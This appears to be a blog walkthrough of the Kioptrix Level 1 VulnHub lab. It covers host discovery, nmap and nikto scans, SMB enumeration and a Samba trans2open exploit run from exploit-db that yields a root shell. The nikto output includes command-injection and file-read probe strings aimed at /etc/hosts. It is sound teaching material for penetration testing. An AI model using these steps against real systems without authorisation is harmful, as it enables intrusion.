---
title: Kioptrix Level 1 Walkthrough
date: 2021-03-08 00:07:37
tags: [WalkThrough, Vulnhub]
---

# Find IP Address of target Box
## check current interface:
```
─# ifconfig                                                     
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.119.130  netmask 255.255.255.0  broadcast 192.168.119.255
        inet6 fe80::20c:29ff:fec4:f034  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:c4:f0:34  txqueuelen 1000  (Ethernet)
        RX packets 184146  bytes 51512617 (49.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 167933  bytes 11553532 (11.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
interface is `eth0`

## netdiscover
Using ARP messages to discover hosts
```
netdiscover -i eth0 
```
-i device: your network device (interface)  

![image](/images/kioptrix1_netdiscover.png "screenshot of netdiscover")

So the target IP address is `192.168.119.254`
 
# Port Scan
## first Scan
```
nmap -Pn -sS --stats-every 3m --max-scan-delay 20 --max-retries 1 --defeat-rst-ratelimit -p1-65535 -oN ~/kiotrix1.txt 192.168.119.254
```

```
--max-scan-delay to avoid following ICMP package get lost  

      --defeat-rst-ratelimit
           Many hosts have long used rate limiting to reduce the number of ICMP error messages (such as
           port-unreachable errors) they send. Some systems now apply similar rate limits to the RST (reset)
           packets they generate. This can slow Nmap down dramatically as it adjusts its timing to reflect those
           rate limits. You can tell Nmap to ignore those rate limits (for port scans such as SYN scan which don't
           treat non-responsive ports as open) by specifying --defeat-rst-ratelimit.

           Using this option can reduce accuracy, as some ports will appear non-responsive because Nmap didn't
           wait long enough for a rate-limited RST response. With a SYN scan, the non-response results in the port
           being labeled filtered rather than the closed state we see when RST packets are received. This option
           is useful when you only care about open ports, and distinguishing between closed and filtered ports
           isn't worth the extra time.
```
The port identifiers are unsigned 16-bit integers, meaning that the largest number you can put in there is 2^16-1 = 65535

Get error: `All 65535 scanned ports on 192.168.119.254 are filtered`


## Issue
192.168.119.254 is not the IP address of Kioptrix box. I encounter a problem that Kioptrix can not be set use NAT or Host only mode. It will automatically switch to Bridged(Automatic) when launching. So weird. Link: [network setting automatically switched to Bridged in VMWare Player](https://stackoverflow.com/questions/66538382/network-setting-automatically-switched-to-bridged-in-vmware-player)

I will stick with briged mode for now, it is not safe btw.

So the IP address of target Box is `192.168.0.22`

## First Scan continue
```
map -sS -n -Pn -p- -T4 192.168.0.22 

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm
```


## Second Scan
```
nmap -Pn -nvv -sSV -p 22,80,111,139,443,1024 --version-intensity 9 -A -oN 192.168.0.22
```
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
--version-intensity \<level\>: Set from 0 (light) to 9 (try all probes)
-sSV is a combine of sS and sV, sV service and version detection


## Some Notes
interesint 80, 443 for webserver, tcp 139 samba 

SMB a communication protocal for providing shared access to files, printers, and serial ports between nodes on a network

```
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
```

## UDP Scan
```
nmap --top-ports 1000 -sU -Pn --stats-every 3m --max-retries 1 -T3 192.168.0.22
```

# SSH enumeration
openssh version: `OpenSSH 2.9p2`  
Google it, find some CVE's with Exec Code Overflow [CVE-2002-0640](https://www.cvedetails.com/cve/CVE-2002-0640/)
need OS to ` when OpenBSD is using PAM modules with interactive keyboard authentication (PAMAuthenticationViaKbdInt). `

```
searchsploit openssh
```

Try directly connect to it:
```
ssh 192.168.0.22    
Unable to negotiate with 192.168.0.22 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

# so use one of the exchange method and try again
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 192.168.0.22 

Unable to negotiate with 192.168.0.22 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se

# then add the cipher
ssh -c aes128-cbc -oKexAlgorithms=+diffie-hellman-group1-sha1 192.168.0.22 
root@192.168.0.22's password: 
```
Last resort for passwork attack, easy be detected, if theres a log
Usually SSH is not your first thing to try



## HTTP Enumeration
port 80 and 443
* go to their web page through web broser
* view the source code
* check out https://

### Directory Scan
```
dirbuster
```
some wordlist stored in `/usr/share/wordlists/dirbuster`
Also download some big wordlist, google `dirbuster wordlist`
I actually not found through google, its in githubrepo https://github.com/digination/dirbuster-ng

remove `manual` from the wordlist, there are many php manual page, waste of time, but let me try
![image](/images/kioptrix1_dirbuster.png "screenshot of dirbuster")

nothing interesting

```
nikto -h 192.168.0.22
```
-h -host

```
---------------------------------------------------------------------------
+ Target IP:          192.168.0.22
+ Target Hostname:    192.168.0.22
+ Target Port:        80
+ Start Time:         2021-03-09 21:53:34 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2021-03-09 21:53:58 (GMT-5) (24 seconds)
---------------------------------------------------------------------------

```

If there's PUT or DELETE method, that would be interesting

scan for https: `nikto -h 192.168.0.22:443`


## SMB Enumeration

add some smb configuration `tc/samba/smb.conf
`
``` notgood
[global]
client use spnego = no
client ntlmv2 auth = no
```
deprecated.. use the following

SPNEGO is used when a client application wants to authenticate to a remote server, but neither end is sure what authentication protocols the other supports.

not sure why I need those

```
enum4linux 192.168.0.22
```

Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.


```
===================================== 
|    Session Check on 192.168.0.22    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

```

resolve the issue by adding this to smb.conf:
```
client min protocol = NT1
```


```
 ====================================== 
|    OS information on 192.168.0.22    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.0.22 from smbclient: 
[+] Got OS info for 192.168.0.22 from srvinfo:
        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
        platform_id     :       500
        os version      :       4.5
        server type     :       0x9a03

```

use metasploit to detect smb version
```
auxiliary/scanner/smb/smb_version
set rhosts 192.168.0.22
show options
exploit
```
samba version is `Samba 2.2.1a`

```
searchsploit samba 2.2
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Samba 2.0.x/2.2 - Arbitrary File Creation                                          | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                       | osx/remote/9924.rb
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                         | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                         | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                         | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                         | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                               | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow            | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                               | linux/remote/7.pl
---------------------------------------------------------------------------------- ---------------------------------
```

goto https://www.exploit-db.com/search, search for trans2open

Tried some exploits, https://www.exploit-db.com/exploits/22469 this one works and I successfully get the shell

```
./22469 -t 192.168.0.22 
```

![image](/images/kioptrix1_root.png "screenshot of dirbuster")


### Nbtscan
```
nbtscan 192.168.0.22
Doing NBT name scan for addresses from 192.168.0.22

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.0.22     KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00

```
Resolve the host name

NetBIOS over TCP/IP (NBT, or sometimes NetBT) is a networking protocol that allows legacy computer applications relying on the NetBIOS API to be used on modern TCP/IP networks. 

On Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445.

Generally speaking, on other systems, you'll find services and applications using port 139. This, basically speaking, means that SMB is running with NetBIOS over TCP/IP, where, stack-wise, SMB is on top of NetBIOS if you are to imagine it with the OSI model.

SMB does rely on NetBIOS for communication with devices that do not support direct hosting of SMB over TCP/IP.

NetBIOS is completely independent from SMB. It is an API that SMB, and other technologies can use, so NetBIOS has no dependency to SMB. 

https://superuser.com/questions/694469/difference-between-netbios-and-smb


### smbclient
```
smbclient -L 192.168.0.22
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        HIRON                INTEL_CE_LINUX
        MYGROUP              KIOPTRIX
                                      
```
-L, --list=HOST

```
smbclient "\\\192.168.0.22\IPC$"
```
see Not enough '\' characters in service, just add more backslashes

## Notes
could also try nmap with smb scripts
```
nmap --script "smb-*" 192.168.0.22
```